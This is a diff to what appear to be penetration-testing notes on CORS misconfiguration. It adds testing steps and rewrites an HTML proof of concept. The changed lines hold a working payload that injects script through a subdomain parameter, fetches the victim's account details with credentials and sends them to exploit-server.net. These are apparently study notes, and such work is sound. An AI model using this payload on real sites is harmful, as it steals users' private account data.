@@ -19,6 +19,8 @@ null
 - They use `dynamic generation` to address this limitation
 - The logic of how an origin is decided to be trusted is what causes the misconfigurations
 ## Testing Methodology
+- Find a request disclosing sensitive information
+- Inject the Origin header and start testing different url options
 - Look at server responses and check for "Access-Control-Allow-Origin" or "Access-Control-Allow-Credentials"
 - Add or change the origin header to set the current host as a subdomain of an attacker controlled domain "current-host.net.attacker-site.com" and observe the server response
 - Add or change the origin header to a subdomain of the current Host value and observe the server response
@@ -72,7 +74,7 @@ null
 <html>
     <body>
         <script>
-        document.location='http://vulnerable-site.net/?parameter=%3Cscript%3Evar%20req%20=%20new%20XMLHttpRequest();%20req.onload%20=%20function(){x%20=%20new%20XMLHttpRequest();%20x.open(%27get%27,%20%27https://exploit-server.net/log?key=%27%2bbtoa(this.responseText));%20x.send()};%20req.open(%27get%27,%27vulnerable-site.net/accountDetails%27,true);%20req.withCredentials%20=%20true;req.send();%3c/script%3E'
+        document.location='http://subdomain.vulnerable-website.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://vulnerable-website.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1'
         </script>
     </body>
 </html>
